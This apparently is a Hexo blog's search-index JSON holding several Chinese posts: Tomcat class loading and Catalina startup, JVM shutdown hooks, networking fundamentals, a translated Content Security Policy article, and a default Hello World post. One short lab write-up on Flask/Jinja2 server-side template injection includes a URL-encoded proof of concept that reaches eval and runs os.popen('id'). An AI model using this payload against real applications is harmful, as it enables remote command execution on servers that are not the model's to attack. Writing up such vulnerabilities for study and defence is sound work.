上文我们讲了Tomcat在初始化时会初始化classLoader。本文将具体分析Tomcat的类加载机制，特别是区别于传统的双亲委派模型的加载机制。 # Tomcat初始化了哪些classloader在Bootstrap中我们可以看到有如下三个classloader # 如何初始化的呢？ 可以看出，catalinaLoader 和 sharedLoader 的 parentClassLoader 是 commonLoader。 # 如何创建classLoader的？不妨再看下如何创建的？ 方法的逻辑也比较简单就是从 catalina.property文件里找 common.loader, shared.loader, server.loader 对应的值，然后构造成Repository 列表，再将Repository 列表传入ClassLoaderFactory.createClassLoader 方法，ClassLoaderFactory.createClassLoader 返回的是 URLClassLoader，而Repository 列表就是这个URLClassLoader 可以加在的类的路径。 在catalina.property文件里 其中 shared.loader, server.loader 是没有值的，createClassLoader 方法里如果没有值的话，就返回传入的 parent ClassLoader，也就是说，commonLoader,catalinaLoader,sharedLoader 其实是一个对象。在Tomcat之前的版本里，这三个是不同的URLClassLoader对象。 初始化完三个ClassLoader对象后，init() 方法就使用 catalinaClassLoader 加载了org.apache.catalina.startup.Catalina 类，并创建了一个对象，然后通过反射调用这个对象的 setParentClassLoader 方法，传入的参数是 sharedClassLoader。最后吧这个 Catania 对象复制给 catalinaDaemon 属性。 # 深入理解可以复习下类加载机制的基础：JVM基础 - Java 类加载机制 # 什么是类加载机制Java是一门面向对象的语言，而对象又必然依托于类。类要运行，必须首先被加载到内存。我们可以简单地把类分为几类： Java自带的核心类 Java支持的可扩展类 我们自己编写的类 为什么要设计多个类加载器？ 如果所有的类都使用一个类加载器来加载，会出现什么问题呢？ 假如我们自己编写一个类java.util.Object，它的实现可能有一定的危险性或者隐藏的bug。而我们知道Java自带的核心类里面也有java.util.Object，如果JVM启动的时候先行加载的是我们自己编写的java.util.Object，那么就有可能出现安全问题！ 所以，Sun（后被Oracle收购）采用了另外一种方式来保证最基本的、也是最核心的功能不会被破坏。你猜的没错，那就是双亲委派模式！ 什么是双亲委派模型？ 双亲委派模型解决了类错乱加载的问题，也设计得非常精妙。 双亲委派模式对类加载器定义了层级，每个类加载器都有一个父类加载器。在一个类需要加载的时候，首先委派给父类加载器来加载，而父类加载器又委派给祖父类加载器来加载，以此类推。如果父类及上面的类加载器都加载不了，那么由当前类加载器来加载，并将被加载的类缓存起来。 所以上述类是这么加载的 Java自带的核心类 – 由启动类加载器加载 Java支持的可扩展类 – 由扩展类加载器加载 我们自己编写的类 – 默认由应用程序类加载器或其子类加载 但它也不是万能的，在有些场景也会遇到它解决不了的问题，比如如下场景。 # 双亲委派模型问题是如何解决的？ 在Java核心类里面有SPI（Service Provider Interface），它由Sun编写规范，第三方来负责实现。SPI需要用到第三方实现类。如果使用双亲委派模型，那么第三方实现类也需要放在Java核心类里面才可以，不然的话第三方实现类将不能被加载使用。但是这显然是不合理的！怎么办呢？ ContextClassLoader（上下文类加载器）就来解围了。 在java.lang.Thread里面有两个方法，get&#x2F;set上下文类加载器 我们可以通过在SPI类里面调用getContextClassLoader来获取第三方实现类的类加载器。由第三方实现类通过调用setContextClassLoader来传入自己实现的类加载器, 这样就变相地解决了双亲委派模式遇到的问题。 # 为什么Tomcat的类加载器也不是双亲委派模型 我们知道，Java默认的类加载机制是通过双亲委派模型来实现的，而Tomcat实现的方式又和双亲委派模型有所区别。 原因在于一个Tomcat容器允许同时运行多个Web程序，每个Web程序依赖的类又必须是相互隔离的。因此，如果Tomcat使用双亲委派模式来加载类的话，将导致Web程序依赖的类变为共享的。 举个例子，假如我们有两个Web程序，一个依赖A库的1.0版本，另一个依赖A库的2.0版本，他们都使用了类xxx.xx.Clazz，其实现的逻辑因类库版本的不同而结构完全不同。那么这两个Web程序的其中一个必然因为加载的Clazz不是所使用的Clazz而出现问题！而这对于开发来说是非常致命的！ # Tomcat类加载机制是怎么样的呢 既然Tomcat的类加载机器不同于双亲委派模式，那么它又是一种怎样的模式呢？ 我们在这里一定要看下官网提供的类加载的文档在新窗口打开 结合经典的类加载机制，我们完整的看下Tomcat类加载图 我们在这张图中看到很多类加载器，除了Jdk自带的类加载器，我们尤其关心Tomcat自身持有的类加载器。仔细一点我们很容易发现：Catalina类加载器和Shared类加载器，他们并不是父子关系，而是兄弟关系。为啥这样设计，我们得分析一下每个类加载器的用途，才能知晓。 Common类加载器 ，负责加载Tomcat和Web应用都复用的类 Catalina类加载器，负责加载Tomcat专用的类，而这些被加载的类在Web应用中将不可见 Shared类加载器 ，负责加载Tomcat下所有的Web应用程序都复用的类，而这些被加载的类在Tomcat中将不可见 WebApp类加载器，负责加载具体的某个Web应用程序所使用到的类，而这些被加载的类在Tomcat和其他的Web应用程序都将不可见 Jsp类加载器，每个jsp页面一个类加载器，不同的jsp页面有不同的类加载器，方便实现jsp页面的热插拔 同样的，我们可以看到通过ContextClassLoader（上下文类加载器）的setContextClassLoader来传入自己实现的类加载器 # WebApp类加载器 到这儿，我们隐隐感觉到少分析了点什么！没错，就是WebApp类加载器。整个启动过程分析下来，我们仍然没有看到这个类加载器。它又是在哪儿出现的呢？ 我们知道WebApp类加载器是Web应用私有的，而每个Web应用其实算是一个Context，那么我们通过Context的实现类应该可以发现。在Tomcat中，Context的默认实现为StandardContext，我们看看这个类的startInternal()方法，在这儿我们发现了我们感兴趣的WebApp类加载器。 入口代码非常简单，就是webappLoader不存在的时候创建一个，并调用setLoader方法。我们接着分析setLoader 这儿，我们感兴趣的就两行代码： # 参考文章  juconcurrent  Tomcat - 启动过程:Catalina的加载 通过前两篇文章，我们知道了Tomcat的类加载机制和整体的组件加载流程；我们也知道通过Bootstrap初始化的catalinaClassLoader加载了Catalina，那么进而引入了一个问题就是Catalina是如何加载的呢？加载了什么呢？本文将带你进一步分析。 # Catalina的引入 通过前两篇文章，我们知道了Tomcat的类加载机制和整体的组件加载流程；我们也知道通过Bootstrap初始化的catalinaClassLoader加载了Catalina，那么进而引入了一个问题就是Catalina是如何加载的呢？加载了什么呢？ 先回顾下整个流程，和我们分析的阶段 看下Bootstrap中Load的过程 # Catalina的加载上一步，我们知道catalina load的触发，因为有参数所以是load(String[])方法。我们进而看下这个load方法做了什么？ load(String[])本质上还是调用了load方法 load加载过程本质上是初始化Server的实例 总体流程如下： # initDirs已经弃用了，Tomcat10会删除这个方法。 # initNaming设置额外的系统变量 # Server.xml的解析分三大块，下面的代码还是很清晰的: # initStreams替换掉System.out, System.err为自定义的PrintStream # Catalina 的启动在 load 方法之后，Tomcat 就初始化了一系列的组件，接着就可以调用 start 方法进行启动了。 上面这段代码，逻辑非常简单，首先确定 getServer() 方法不为 null ，也就是确定 server 属性不为null，而 server 属性是在 load 方法就初始化了。 整段代码的核心就是 try-catch 里的 getServer().start() 方法了，也就是调用 Server 对象的 start() 方法来启动 Tomcat。本篇文章就先不对 Server 的 start() 方法进行解析了，下篇文章会单独讲。 # Catalina 的关闭调用完 Server#start 方法之后，注册了一个ShutDownHook，也就是 CatalinaShutdownHook 对象， CatalinaShutdownHook 的逻辑也简单，就是调用 Catalina 对象的 stop 方法来停止 tomcat。 最后就进入 if 语句了，await 是在 Bootstrap 里调用的时候设置为 true 的，也就是本文开头的时候提到的三个方法中的一个。await 方法的作用是停住主线程，等待用户输入shutdown 命令之后，停止等待，之后 main 线程就调用 stop 方法来停止Tomcat。 Catalina 的 stop 方法主要逻辑是调用 Server 对象的 stop 方法。 # 聊聊关闭钩子上面我们看到CatalinaShutdownHook, 这里有必要谈谈JVM的关闭钩子。 关闭钩子是指通过Runtime.addShutdownHook注册的但尚未开始的线程。这些钩子可以用于实现服务或者应用程序的清理工作，例如删除临时文件，或者清除无法由操作系统自动清除的资源。 JVM既可以正常关闭，也可以强行关闭。正常关闭的触发方式有多种，包括：当最后一个“正常（非守护）”线程结束时，或者当调用了System.exit时，或者通过其他特定于平台的方法关闭时（例如发送了SIGINT信号或者键入Ctrl-C）。 在正常关闭中，JVM首先调用所有已注册的关闭钩子。JVM并不能保证关闭钩子的调用顺序。在关闭应用程序线程时，如果有（守护或者非守护）线程仍然在执行，那么这些线程接下来将与关闭进程并发执行。当所有的关闭钩子都执行结束时，如果runFinalizersOnExit为true【通过Runtime.runFinalizersOnExit(true)设置】，那么JVM将运行这些Finalizer（对象重写的finalize方法），然后再停止。JVM不会停止或中断任何在关闭时仍然运行的应用程序线程。当JVM最终结束时，这些线程将被强行结束。如果关闭钩子或者Finalizer没有执行完成，那么正常关闭进程“挂起”并且JVM必须被强行关闭。当JVM被强行关闭时，只是关闭JVM，并不会运行关闭钩子（举个例子，类似于电源都直接拔了，还怎么做其它动作呢？）。 下面是一个简单的示例： 和（可能的）执行结果（因为JVM不保证关闭钩子的调用顺序，因此结果中的第二、三行可能出现相反的顺序）： 可以看到，main函数执行完成，首先输出的是Main Thread Ends，接下来执行关闭钩子，输出Hook2 Ends和Hook1 Ends。这两行也可以证实：JVM确实不是以注册的顺序来调用关闭钩子的。而由于hook3在调用了addShutdownHook后，接着对其调用了removeShutdownHook将其移除，于是hook3在JVM退出时没有执行，因此没有输出Hook3 Ends。 另外，由于MyHook类实现了finalize方法，而main函数中第一行又通过Runtime.runFinalizersOnExit(true)打开了退出JVM时执行Finalizer的开关，于是3个hook对象的finalize方法被调用，输出了3行Finalize。 注意，多次调用addShutdownHook来注册同一个关闭钩子将会抛出IllegalArgumentException: 另外，从JavaDoc中得知：一旦JVM关闭流程开始，就只能通过调用halt方法来停止该流程，也不可能再注册或移除关闭钩子了，这些操作将导致抛出IllegalStateException。 如果在关闭钩子中关闭应用程序的公共的组件，如日志服务，或者数据库连接等，像下面这样： 由于关闭钩子将并发执行，因此在关闭日志时可能导致其他需要日志服务的关闭钩子产生问题。为了避免这种情况，可以使关闭钩子不依赖那些可能被应用程序或其他关闭钩子关闭的服务。实现这种功能的一种方式是对所有服务使用同一个关闭钩子（而不是每个服务使用一个不同的关闭钩子），并且在该关闭钩子中执行一系列的关闭操作。这确保了关闭操作在单个线程中串行执行，从而避免了在关闭操作之前出现竞态条件或死锁等问题。 # 使用场景通过Hook实现临时文件清理 # 小结Catalina 类承接了 Bootstrap 类的 load 和 start 方法，然后根据配置初始化了 Tomcat 的组件，并调用了 Server 类的 init 和 start 方法来启动 Tomcat。 # 参考文章   "},{"title":"Flask（Jinja2） 服务端模板注入漏洞","date":"2023-08-09T12:53:08.000Z","url":"/2023/08/09/Flask%EF%BC%88Jinja2%EF%BC%89-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","categories":[["undefined",""]],"content":"Flask（Jinja2） 服务端模板注入漏洞原理参考文章：   测试编译及运行测试环境： 安装Arjungit clone  cd Arjun python3 setup.py install 访问*233&#125;&#125;，得到54289，说明SSTI漏洞存在。 获取eval函数并执行任意python代码的POC： 访问()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D，得到执行结果： "},{"title":"计算机网络","date":"2023-08-09T12:52:29.000Z","url":"/2023/08/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/","categories":[["undefined",""]],"content":"计算机网络计算机网络的主要作用就是实现计算机之间的通信，这是主要的作用。 物理层物理层主要功能：为数据端设备提供传送数据通路、传输数据。 假设现在有两台计算机，我们需要实现这两台计算机之间的通信，最简单的方式是用一根线将他们连起来，使用高低电平来进行通信，但如果计算机的数量提升到五台，这时候就需要五台计算机之间两两连线才能通过这种方法进行计算机的通信。这种情况下，需要的线的数量就会有大幅提升，这时，就提出两个重要的思想：1.转发，2.标识。这时候通过一个设备来统一进行转发。这种设备叫做hub（集线器），假设这五台计算机分别为A,B,C,D,E,集线器为F.这时，A,B,C,D,E全部接入F,网络拓扑图大概如下： 当A向C通信时，A先将需要发送的数据发往F，F做一个无条件的转发，将数据发往B，C，D，E，当B接收到这个数据之后，发现不是发送给B的，就将其丢弃，当C接收到数据，发现是发送给C的，就接收数据。这种方式就是消息洪泛。这种设计有一个问题，就是当A在发送的同时，E也在发送，但集线器只能处理电信号，集线器没法分辩这两个电信号，所以他在转发的时候就会将其杂糅在一起，发送给其他设备，这就导致其他设备接收到的数据是混合起来的，数据就无法解析。针对这一问题就提出了一种协议，叫做CSMA&#x2F;CD，CSMA&#x2F;CD实现一种载波监听的功能，通过载波监听的方式，在发送数据的时候，先检测链路上有没有其他设备在发送数据，如果没有的话，再进行发送，这就是载波监听的主要的一个功能，能够防止冲突。这种方法有什么问题呢，首先，进行数据广播，带宽利用率比较低，其次，所有链路上同时只能有一个设备进行发送数据，导致链路的利用率很低，如果当设备数量较大时比如1k台设备，发送数据的时间间隔就会特别大。所有这种方式只适用于很小很小的范围内，比如只有几台设备的网络里。 数据链路层 针对上面的问题，提出了第二章设备，交换机（switch），交换机主要作用也是起到一个转发的作用，而集线器最大的问题是没有记录设备的标识符，它只是将数据广播出去,由设备进行判断处理，这样导致传输效率特别低，并且不安全。交换机中记录了地址与物理端口的映射方式。记录的地址是mac地址（物理地址），这个地址是全球唯一的，但是是可以改的。交换机中存在一张表，记录了每个mac地址和对应的端口。交换机的通信是全双工的，集线器用的线大多是双绞线，双绞线在工作的时候是只能有一台设备进行发送数据的。交换机现在用的就是网线了，网线里面一般有八根线，正常情况下至少有4根线在进行工作，这导致在发送数据的同时也能接收数据。当一台全新的交换机设备接入网络中时，假设计算机分别为A,B,C，交换机为F、网络拓扑图如下 此时还未进行任何通信，记录mac地址与端口的表为空，当A向B发送数据时，过程如下：A将数据发送到交换机，交换机收到数据，记录下A的mac地址和端口，只是交换机中找不到B，就将数据从所有端口发出，当B做出回应，交换机就记录了B的mac地址和端口。 进过多次通信，所有设备都能够记录mac地址与端口的映射。 交换机是可以和交换机连接的。以下面网络拓扑图为例 记录过程其实与单台交换机一样，当A向E发送数据时，A在F中找不到E，就向所有端口发送数据，G接收到数据，就将其发给E，E做出回应，F就记录E的mac地址和对应的物理端口，而实际的物理端口是接入了另一台交换机的，假设端口为端口四，记录表中记录类似于{macE：端口四}{macD：端口四}，端口号可以重复。这种设计存在一些问题：一个表大概能够存储几千个。而且多连接交换机会存在如果第一个交换机没有记录，就会在进行广播，如果再没有就在下一个交换机进行广播，直到找到目标，就导致一个消息的洪泛，效率比较低，适用于一个比较小的网络，几千台设备的网络。数据链路层会在 frame 尾端置放检查码（parity，sum，CRC）以检查实质内容，将物理层提供的可能出错的物理连接改造成逻辑上无差错的数据链路，并对物理层的原始数据进行数据封装。从数据链路层开始对数据进行封装。 数据链路层协议首先Ethernet、IEEE802.3、PPP和HDLC都是数据链路层的协议，只不过后面三个不常用而已，数据链路层最常用的协议是Etnernet以太网协议。 Ethernet和IEEE802.3属于以太链路层协议 广域网中经常会使用串行链路来提供远距离的数据传输，高级数据链路控制HDLC（High-Level Data Link Control）和点对点协议PPP（ Point to Point Protocol）是两种典型的串口封装协议。 Ethernet以太网协议Ethernet以太网协议，用于实现链路层的数据传输和地址封装 以太网数据帧的封装 从上图可以看到 Ethernet II帧，目的地址、源地址字段各占6个字节，目的地址字段确定帧的接收者，源地址字段标识帧发送者。当使用六个字节的源地址字段时，前三个字节表示由IEEE分配给厂商的地址，将烧录在每一块网络接口卡的ROM中。而制造商通常为其每一网络接口卡分配后字节。其实目的、源地址就是我们经常说的MAC地址，比如00:1A:A0:31:39:D4就是一个MAC地址。类型字段，为2字节，用来标识上一层所使用的协议类型，如IP协议（0x0800）,ARP(0x0806)等。数据字段 以太网包最小规定为64字节，不足的也会填充到64字节。以太网包的最大长度是1518字节，数据字段长度范围为46到1500，这是为什么呢？因为以太网包最小规定为64字节，不足的也会填充到64字节。而以太网帧格式的其他部分加起来是6+6+2+4&#x3D;18字节，所以数据部分的最小长度为64-18&#x3D;46字节；而以太网包的最大长度是1518字节，因此1518-18&#x3D;1500字节。FCS字段是帧校验字段，即Frame Check Sequence，用来保存CRC(循环冗余校验)校验值。 IEEE802.3协议IEEE 802.3 通常指以太网，一种网络协议。描述物理层和数据链路层的MAC子层的实现方法，在多种物理媒体上以多种速率采用CSMA&#x2F;CD访问方式MAC（MediaAccessControl）媒体访问控制层，该层定义了数据包怎样在介质上进行传输。LLC （LogicalLinks Control）逻辑链路控制层 PPP协议PPP协议是一种点到点(一根链路两端只有两个接口)链路层协议，主要用于在全双工的同异步链路上进行点到点的数据传输。 LCP是用来创建二层连接的，是有连接的(以太协议无连接)；NCP是用来实现三层通信的 HDLC协议HDLC(High-level Data Link Control)，高级数据链路控制，简称HDLC，是一种面向比特的链路层协议，思科私有协议，现在几乎不用 网络层 当交换机表满的时候，如果再需要记录新的，就会顶掉已经记录的，而且当需要跨网络发送消息时，需要进行广播，效率很低，这时候设计了一个设备：路由器（又叫网关），实现不同网络之间的通信，引入了一个新的标识：ip，ip主要实现两个功能：1.标识网络，2.标识设备，ip是一个抽象的标识符。 ospf协议（最短路径协议）出现主要是弥补rip协议以跳数寻找最短路径方法缺陷， 在实际情况中，光凭跳数实际并不是最短路径，ospf改为消耗时间进行计算，"},{"title":"HTML5安全：内容安全策略(CSP)","date":"2023-08-01T12:20:33.000Z","url":"/2023/08/01/HTML5%E5%AE%89%E5%85%A8%EF%BC%9A%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP/","categories":[["undefined",""]],"content":"万维网的安全策略植根于同源策略。例如的代码只能访问[]()的数据，而没有访问[]()的权限。每个来源都与网络的其它部分分隔开，为开发人员构建了一个安全的沙箱。理论上这是完美的，但是现在攻击者已经找到了聪明的方式来破坏这个系统。 这就是XSS跨站脚本攻击，通过虚假内容和诱骗点击来绕过同源策略。这是一个很大的问题，如果攻击者成功注入代码，有相当多的用户数据会被泄漏。 现在我们介绍一个全新的、有效的安全防御策略来减轻这种风险，这就是内容安全策略（ContentSecurity Policy，CSP）。 来源白名单 XSS攻击的核心是利用了浏览器无法区分脚本是被第三方注入的，还是真的是你应用程序的一部分。例如Google +1按钮会从加载并执行代码，[但是我们不能指望从浏览器上的图片就能判断出代码是真的来自apis.google.com]()，[还是来自apis.evil.example.com]()。浏览器下载并执行任意代码的页面请求，而不论其来源。 CSP定义了Content-Security-PolicyHTTP头来允许你创建一个可信来源的白名单，使得浏览器只执行和渲染来自这些来源的资源，而不是盲目信任服务器提供的所有内容。即使攻击者可以找到漏洞来注入脚本，但是因为来源不包含在白名单里，因此将不会被执行。 以上面Google +1按钮为例，因为我们相信apis.google.com提供有效的代码，以及我们自己，所以可以定义一个策略，允许浏览器只会执行下面两个来源之一的脚本。 Content-Security-Policy:script-src ‘self’  是不是很简单？script-src可以为指定页面控制脚本相关权限。这样浏览器只会下载和执行来自和本页自身的脚本。 一旦我们定义了这个策略，浏览器会在检测到注入代码时抛出一个错误（请注意是什么浏览器）。 内容安全策略适用于所有常用资源 虽然脚本资源是最明显的安全隐患，但是CSP还提供了一套丰富的指令集，允许页面控制加载各种类型的资源，例如如下的类型： content-src：限制连接的类型（例如XHR、WebSockets和EventSource） font-src：控制网络字体的来源。例如可以通过font-src 来使用Google的网络字体。 frame-src：列出了可以嵌入的frame的来源。例如frame-src 只允许嵌入YouTube的视频。。 img-src：定义了可加载图像的来源。 media-src：限制视频和音频的来源。 object-src：限制Flash和其他插件的来源。 style-src：类似于Script-src，只是作用于css文件。 默认情况下，所有的设置都是打开的，不做任何限制。你可以以分号分隔多个指令，但是类似于script-src 的形式，第二个指令将会被忽略。正确的写法是script-src 。 例如，你有一个应用需要从内容分发网络（CDN，例如）加载所有的资源，并且知道不需要任何frame和插件的内容，你的策略可能会像下面这样： 细节 我在例子里使用的HTTP头是Content-Security-Policy，但是现代浏览器已经通过前缀来提供了支持：Firefox使用x-Content-Security-Policy，WebKit使用X-WebKit-CSP。未来会逐步过渡到统一的标准。 策略可以根据每个不同的页面而设定，这提供了很大的灵活度。因为你的站点可能有的页面有Google +1的按钮，而有的则没有。 每个指令的来源列表可以相当灵活，你可以指定模式（data:, https:），或者指定主机名在一个范围（example.com，它匹配主机上的任意来源、任意模式和任意端口），或者指定一个完整的URI（，特指https协议，example.com域名，443端口）。 你在来源列表中还可以使用四个关键字： “none”：你可能期望不匹配任何内容 “self”：与当前来源相同，但不包含子域 “unsafe-inline”：允许内联Javascript和CSS “unsafe-eval”：允许文本到JS的机制例如eval 请注意，这些关键词需要加引号。 沙箱 这里还有另外一个值得讨论的指令：sandbox。和其他指令有些不一致，它主要是控制页面上采取的行为，而不是页面能够加载的资源。如果设置了这个属性，页面就表现为一个设置了sandbox属性的frame一样。这对页面有很大范围的影响，例如防止表单提交等。这有点超出了本文的范围，但是你可以在HTML5规范的“沙箱标志设置”章节找到更多信息。 有害的内联代码 CSP基于来源白名单，但是它不能解决XSS攻击的最大来源：内联脚本注入。如果攻击者可以注入包含有害代码的script标签（），浏览器并没有好的机制来区分这个标签。CSP只能通过完全禁止内联脚本来解决这个问题。 这个禁止项不仅包括脚本中嵌入的script标签，还包括内联事件处理程序和javascrpt:这种URL。你需要把script标签的内容放到一个外部文件里，并且用适当的addEventListener的方式替换javascript:和&lt;a… onclick&#x3D;”[JAVASCRIPT]”&gt;。例如，你可能会把下面的表单： 重写为下面的形式： 无论是否使用CSP，以上的代码其实有更大的优点。内联JavaScript完全混合了结构和行为，你不应该这么做。另外外联资源更容易进行浏览器缓存，开发者更容易理解，并且便于编译和压缩。如果采用外联代码，你会写出更好的代码。 内联样式需要以同样的方式进行处理，无论是style属性还是style标签都需要提取到外部样式表中。这样可以防止各式各样神奇的数据泄漏方式。 如果你必须要有内联脚本和样式，可以为script-src or style-src属性设定’unsafe-inline值。但是不要这样做，禁止内联脚本是CSP提供的最大安全保证，同时禁止内联样式可以让你的应用变得更加安全和健壮。这是一个权衡，但是非常值得。 Eval 即便攻击者不能直接注入脚本，他可能会诱使你的应用把插入的文本转换为可执行脚本并且自我执行。eval() , newFunction() , setTimeout([string], …) 和setInterval([string], …) 都可能成为这种危险的载体。CSP针对这种风险的策略是，完全阻止这些载体。 这对你构建应用的方式有一些影响： 通过内置的JSON.parse解析JSON，而不依靠eval。IE8以后的浏览器都支持本地JSON操作，这是完全安全的。 通过内联函数代替字符串来重写你setTimeout和setInterval的调用方式。例如： 可以重写为： 避免运行时的内联模版：许多模版库都使用new Function()以加速模版的生成。这对动态程序来说非常棒，但是对恶意文本来说存在风险。 报告 CSP可以在服务器端阻止不可信的资源对用户来说非常有用，但是对于获取各种发送到服务器的通知来说对我们却非常有用，这样我们就能识别和修复任何恶意脚本注入。为此你可以通过report-uri指令指示浏览器发送JSON格式的拦截报告到某个地址。 报告看起来会像下面这样： 其中包含的信息会帮助你识别拦截的情况，包括拦截发生的页面（document-uri），页面的referrer，违反页面策略的资源（blocked-uri），所违反的指令（violated-directive）以及页面所有的内容安全策略（original-policy）。 现实用法 CSP现在在Chrome 16+和Firefox 4+的浏览器上可用，并且它在IE10上预计会获得有限的支持。Safari目前还不支持，但是WebKit每晚构建版已经可用，所以预计Safari将会在下面的迭代中提供支持。 下面让我们看一些常用的用例： 实际案例1：社会化媒体widget Google +1 button包括来自的脚本，以及嵌入自的iframe。你的策略需要包含这些源来使用Google +1的按钮。最简单的策略是script-src ; frame-src 。你还需要确保Google提供的JS片段存放在外部的JS文件里。 Facebook的Like按钮有许多种实现方案。我建议你坚持使用iframe版本，因为它可以和你站点的其它部分保持很好的隔离。这需要使用frame-src 指令。请注意，默认情况下，Facebook提供的iframe代码使用的是相对路径&#x2F;&#x2F;facebook.com，请把这段代码修改为，HTTP你没有必要可以不使用。 Twitter的Tweet按钮依赖于script和frame，都来自于（Twitter默认提供的是相对URL，请在复制的时候编辑代码来指定为HTTPS方式）。 其它的平台有相似的情况，可以类似的解决。我建议把default-src设置为none，然后查看控制台来检查你需要使用哪些资源来确保widget正常工作。 使用多个widget非常简单：只需要合并所有的策略指令，记住把同一指令的设置都放在一起。如果你想使用上面这三个widget，策略看起来会像下面这样： 实际案例2：防御 假设你访问一个银行网站，并且希望确保只加载你所需的资源。在这种情况下，开始设置一个默认的权限来阻止所有的内容（default-src ‘none’），并且从这从头构建策略。 比如，银行网站需要从来自的CDN加载图像、样式和脚本，并且通过XHR连接到来拉取各种数据，还需要使用frame，但是frame都来自非第三方的本地页面。网站上没有Flash、字体和其他内容。这种情况下我们可以发送最严格的CSP头是： 实际案例3：只用SSL 一个婚戒论坛管理员希望所有的资源都通过安全的方式进行加载，但是不想真的编写太多代码；重写大量第三方论坛内联脚本和样式的代码超出了他的能力。所以以下的策略将会是非常有用的： 尽管default-src指定了https，脚本和样式不会自动继承。每个指令将会完全覆盖默认资源类型。 未来 W3C的Web应用安全工作组正在制定内容安全策略规范的细节，1.0版本将要进入最后修订阶段，它和本文描述的内容已经非常接近。而public-webappsec@邮件组正在讨论1.1版本，浏览器厂商也在努力巩固和改进CSP的实现。 CSP 1.1在画板上有一些有趣的地方，值得单独列出来： 通过meta标签添加策略：CSP的首选设置方式是HTTP头，它非常有用，但是通过标记或者脚本设置会更加直接，不过目前还未最终确定。WebKit已经实现了通过meta元素进行权限设置的特性，所以你现在可以在Chrome下尝试如下的设置：在文档头添加&lt;metahttp-equiv&#x3D;”X-WebKit-CSP” content&#x3D;”[POLICY GOES HERE]”&gt;。 你甚至可以在运行时通过脚本来添加策略。 DOM API：如果CSP的下一个迭代添加了这个特性，你可以通过Javascript来查询页面当前的安全策略，并根据不同的情况进行调整。例如在eval()是否可用的情况下，你的代码实现可能会有些许不同。这对JS框架的作者来说非常有用；并且API规范目前还非常不确定，你可以在规范草案的脚本接口章节找到最新的迭代版本。** 新的指令：许多新指令正在讨论中，包括script-nonce：只有明确指定的脚本元素才能使用内联脚本；plugin-types：这将限制插件的类型；form-action：允许form只能提交到特定的来源。"},{"title":"Hello World","date":"2023-07-30T09:48:42.100Z","url":"/2023/07/30/hello-world/","categories":[["undefined",""]],"content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post More info: Writing Run server More info: Server Generate static files More info: Generating Deploy to remote sites More info: Deployment"}]